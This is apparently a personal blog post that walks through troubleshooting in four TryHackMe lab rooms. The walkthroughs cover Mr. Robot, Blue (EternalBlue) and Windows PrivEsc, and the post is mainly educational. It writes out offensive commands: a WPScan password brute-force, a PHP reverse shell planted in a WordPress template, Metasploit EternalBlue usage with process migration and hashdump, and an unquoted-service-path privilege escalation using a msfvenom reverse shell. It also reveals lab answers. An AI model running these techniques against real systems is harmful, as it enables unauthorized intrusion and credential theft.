---
title: "Confessions of a Top 2% TryHackMe Practitioner: Where Tools Break, Where I Got Stuck, and What CTFs Actually Teach"
author: parthpandey
categories: [Cybersecurity, Practical-Experience]
tags: [tryhackme, nmap, metasploit, hydra, privilege-escalation, windows, linux, troubleshooting, medium]
render_with_liquid: false
date: 2026-10-26 23:00:00 +0530
---

# Confessions of a Top 2% TryHackMe Practitioner: Where Tools Break, Where I Got Stuck, and What CTFs Actually Teach

**By Parth Pandey**  
*Ranked Top 2% Globally on TryHackMe | Level 12 [GURU] | 115+ Rooms Completed | 122-Day Continuous Streak*  
*LinkedIn: [linkedin.com/in/parth-pandey-045709258](https://linkedin.com/in/parth-pandey-045709258) | GitHub: [@ParthPandey25](https://github.com/ParthPandey25)*

---

When recruiters or junior students look at a resume that says **"Top 2% on TryHackMe, 115+ rooms completed"**, there is a common misconception that getting through rooms is a smooth, scripted journey. You read the briefing, launch an automated tool like `nmap` or `sqlmap` or `metasploit`, grab a cup of coffee, and wait for the root flag to appear on your terminal.

**The reality is the exact opposite.**

Anyone who has actually spent nights staring at a blinking green cursor knows that automated security tools fail constantly. They hang. They overwhelm targets. They flood you with false positives. They crash kernel processes.

The real education in cybersecurity doesn’t come from running tools when they work—**it comes from what you think and do when the tool gets completely stuck.**

In this article, I want to pull back the curtain on four distinct times I hit a wall on TryHackMe rooms, what I was thinking in the moment, why the standard tool broke, and the troubleshooting pivots that actually unlocked the root shell.

---

## 1. The 850,000-Word Dictionary That Froze My Terminal (`Mr. Robot` CTF)

### The Setup & What I Was Thinking
In the **Mr. Robot** machine, standard directory enumeration immediately led me to `/robots.txt`. Inside, I discovered two treasures: `key-1-of-3.txt` and a custom wordlist called `fsocity.dic`.

My immediate thought was classic junior overconfidence:  
> *"Jackpot! The challenge creator literally gave me the wordlist. I'll just point WPScan or Hydra at the `/wp-login.php` endpoint with user `elliot`, set it running, and walk away."*

### Where I Got Stuck
I fired up WPScan:
```bash
wpscan --url http://10.10.X.X -U elliot -P fsocity.dic
```
Ten minutes passed. Then twenty. My Kali VM's fans were spinning at maximum speed. Suddenly, the scan started spitting out `HTTP 429 Too Many Requests` followed by `Connection reset by peer`. Then Hydra gave up with `Child process died`. The web server had become unresponsive.

I was stuck. Did the VM crash? Was the wordlist corrupt? Why was a dictionary attack taking an estimated 9 hours on a local virtual lab?

### The Diagnostic Thought Process
Instead of re-running the same command blindly, I paused and inspected the wordlist itself:
```bash
wc -l fsocity.dic
# 858,160 lines!
```
858,000 words. Why would an introductory CTF give you an 850k dictionary for an Apache target that handles maybe 10 requests per second?

I ran `head -n 50 fsocity.dic` and looked at the raw text. Then I piped it to `sort` and inspected the counts:
```bash
sort fsocity.dic | uniq -c | sort -nr | head -n 20
```
The revelation was immediate: **the dictionary was filled with duplicates.** The same 50 words were repeated thousands of times throughout the file.

### The Breakthrough Fix
I stripped out every duplicate using standard Unix utilities:
```bash
sort -u fsocity.dic -o fsocity_clean.dic
wc -l fsocity_clean.dic
# 11,451 lines!
```
In one command, the wordlist shrank from **858,160 lines to 11,451 lines**—a **98.6% reduction in volume**.

I re-ran the attack against `wp-login.php`. With only 11k requests, the server handled the load without rate-limiting, and in less than 3 minutes, WPScan spat out the valid password: `ER28-0652`.

> **Key Takeaway**: *Never feed unvetted, unparsed data into an attack tool. Understanding Linux core utilities (`sort`, `uniq`, `awk`) is 10x more valuable than knowing tool flags.*

---

## 2. The "Dumb Shell" Trap: Why Netcat Froze When Switching Users

### What I Was Thinking
After logging into the WordPress admin portal as `elliot`, I injected a classic PentestMonkey PHP reverse shell into the theme's `404.php` template. I fired up Netcat on port 4444, curled the 404 page, and caught a connection:
```console
listening on [any] 4444 ...
connect to [10.14.X.X] from (UNKNOWN) [10.10.X.X] 52314
daemon@linux:/$
```
I found the user `robot`'s home directory. Inside was an MD5 password hash (`c3fcd3d76192e4007dfb496cca67e13b`). I cracked it in seconds using John the Ripper (`abcdefghijklmnopqrstuvwxyz`).

Now all I had to do was switch user:
```bash
su - robot
```

### Where I Got Stuck
The moment I hit Enter, the terminal printed:
```
su: must be run from a terminal
```
I tried again. Then the terminal completely hung. When I hit `Ctrl+C` to break out, **it killed my entire Netcat listener**, terminating my reverse shell. I had to go back to the browser, re-curl the 404 page, and start all over again.

### Why It Broke
A raw Netcat reverse shell is **not a TTY terminal**. It is simply a raw standard input/standard output pipe (`stdin`/`stdout`). It has no concept of cursor positioning, job control, signals, or password masking. When commands like `su`, `sudo`, or `passwd` run, they explicitly check for an active TTY device (`/dev/tty`) to prevent passwords from being echoed onto cleartext pipelines.

### The Breakthrough Fix
I learned how to properly stabilize a reverse shell using Python's pseudo-terminal library:

```bash
# Step 1: Spawn a PTY shell inside the dumb shell
python -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background the netcat listener
Ctrl + Z

# Step 3: Configure your local terminal to send raw character codes
stty raw -echo; fg

# Step 4: Re-initialize terminal environment
reset
export TERM=xterm
export SHELL=bash
stty rows 38 columns 116
```
Now, I had full interactive capabilities: tab-completion, history navigation with the arrow keys, `Ctrl+C` signal isolation, and full TTY support.

Running `su - robot` immediately prompted for the password cleanly, and I was in.

---

## 3. The Vanishing Meterpreter Session (`Blue` / MS17-010)

### What I Was Thinking
Every beginner learns about **EternalBlue (MS17-010)**. It's the crown jewel of Windows remote code execution. On the TryHackMe **Blue** room, running `nmap --script smb-vuln-ms17-010` confirmed the Windows 7 host was vulnerable.

I booted up `msfconsole`:
```console
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.X.X
set LHOST 10.14.X.X
exploit
```

### Where I Got Stuck
The exploit fired. The stage was sent. The terminal announced:
```console
[*] Meterpreter session 1 opened (10.14.X.X:4444 -> 10.10.X.X:49175)
```
I pumped my fist in celebration, typed `getuid`, and before the output returned:
```console
[-] Meterpreter session 1 closed. Reason: Died
```
The session died within 10 seconds. I tried running `exploit` again. This time:
```console
[-] Exploit failed [unreachable]: Rex::ConnectionTimeout
```
The entire Windows virtual machine had suffered a Blue Screen of Death (BSOD) and crashed.

### Why It Broke
EternalBlue works by exploiting a memory allocation bug in Microsoft's SMBv1 kernel driver (`srv.sys`) using a technique called **kernel pool spraying**. When the exploit succeeds, it injects shellcode directly into an unallocated kernel memory space or a fragile system process.

If that initial process terminates, or if another Windows kernel thread tries to access that corrupted pool memory before you migrate, **the payload crashes and takes the operating system down with it.**

### The Breakthrough Fix
You cannot afford to sit and look around in an initial EternalBlue shell. You have two reliable solutions:

**Solution A: Automatic Migration via Metasploit**
Before firing the exploit, tell Metasploit to automatically migrate into a permanent, stable Windows system process as soon as the session opens:
```console
set AutoRunScript post/windows/manage/migrate
exploit
```

**Solution B: Manual Lightning Migration**
The moment the session opens, immediately list processes and migrate to the Windows Print Spooler (`spoolsv.exe`), which always runs with `NT AUTHORITY\SYSTEM` privileges:
```console
meterpreter > ps
# Find PID of spoolsv.exe (e.g., 1284)
meterpreter > migrate 1284
[*] Migrating from 2140 to 1284...
[*] Migration completed successfully.
```
Once safely anchored inside `spoolsv.exe`, the connection remained rock-solid for hours, enabling me to dump the SAM database hashes (`hashdump`) without risking a crash.

---

## 4. The Illusion of Unquoted Service Paths (`Windows PrivEsc`)

### What I Was Thinking
In the **Windows PrivEsc** room, I used `wmic` to search for services with unquoted paths containing spaces:
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```
I found a vulnerable service:
```
Path: C:\Program Files\Development Tools\ServiceEngine.exe
```
Because the path contains spaces and lacks quotation marks, Windows service manager resolves the executable in this sequence:
1. `C:\Program.exe`
2. `C:\Program Files\Development.exe`
3. `C:\Program Files\Development Tools\ServiceEngine.exe`

My plan was simple: generate a reverse shell with `msfvenom`, name it `Program.exe`, drop it into `C:\`, and restart the service.

### Where I Got Stuck
I generated the payload, transferred it to the victim machine, and executed:
```cmd
copy reverse.exe C:\Program.exe
```
The command immediately failed:
```
Access is denied.
```
I stared at the screen. The theoretical concept in every textbook said "drop `Program.exe` in `C:\`". Why was it giving me `Access is denied`?

### The Reality Check
Textbook security theory often ignores modern Windows security architecture. Since Windows Vista and Windows 7, the root directory of the system drive (`C:\`) has a strict Access Control List (DACL) that prevents unprivileged users from writing files to root.

You cannot simply drop files in `C:\` unless you are already an Administrator!

### The Breakthrough Fix
I had to find where I **actually** had write permissions along the path. I transferred `accesschk.exe` (from Sysinternals) to check permissions on the subfolders:
```cmd
accesschk.exe /accepteula -uwdq "C:\Program Files\Development Tools"
```
Output:
```
RW BUILTIN\Users
```
Standard users had `FILE_ADD_FILE` and `FILE_WRITE_DATA` permissions on the `Development Tools` subfolder!

Therefore, the second split in the unquoted path—`C:\Program Files\Development.exe`—was write-accessible:
```cmd
copy reverse.exe "C:\Program Files\Development Tools\Development.exe"
net stop ServiceEngine
net start ServiceEngine
```
The service restarted, parsed `Development.exe` before reaching `ServiceEngine.exe`, and caught an elevated reverse shell running as `NT AUTHORITY\SYSTEM`.

---

## 5. My Top High-Impact TryHackMe Rooms for Every Cybersecurity Domain

For anyone building an authentic portfolio or preparing for technical SOC Analyst / Junior Penetration Tester interviews, here are the essential rooms that taught me the most:

| Domain | Key Rooms | Core Skills Proven |
|---|---|---|
| **Active Directory & Windows** | **Blue**, **Ice**, **Windows PrivEsc**, **Attacktive Directory** | SMBv1 memory corruption, token impersonation (`SeImpersonate`), Kerberos pre-auth attacks, unquoted paths, Mimikatz memory dumping. |
| **Linux Privilege Escalation** | **Mr. Robot**, **Kenobi**, **Vulnversity**, **RootMe** | SUID binaries, path hijacking, cron job exploitation, TTY shell stabilization, ProFTPD vulnerabilities. |
| **Web App Security & OWASP** | **OWASP Top 10**, **Juice Shop**, **Burp Suite Basics** | SQL injection filter bypass, reflected/stored XSS, IDOR enumeration, CSRF token validation. |
| **SOC & Defensive Telemetry** | **Splunk 101**, **Splunk Exploring SPL**, **Wireshark 101**, **Snort** | Authoring targeted SPL correlation searches, analyzing PCAP packet headers, signature writing, alert triage. |

---

## Conclusion: Tools Are Just Hammers—Your Diagnostic Mind Is the Carpenter

Achieving a Top 2% global rank on TryHackMe taught me that technical excellence is never about running an exploit script and hoping for magic.

Tools will break. Exploits will crash. Dictionaries will be dirty. Network latency will drop your sockets.

What separates an automated script-runner from a true cybersecurity professional is the ability to read the error message, analyze the underlying architecture, troubleshoot the failure, and adapt.

*If you found this write-up helpful, connect with me on [LinkedIn](https://linkedin.com/in/parth-pandey-045709258) or explore my full security projects on [GitHub](https://github.com/ParthPandey25).*
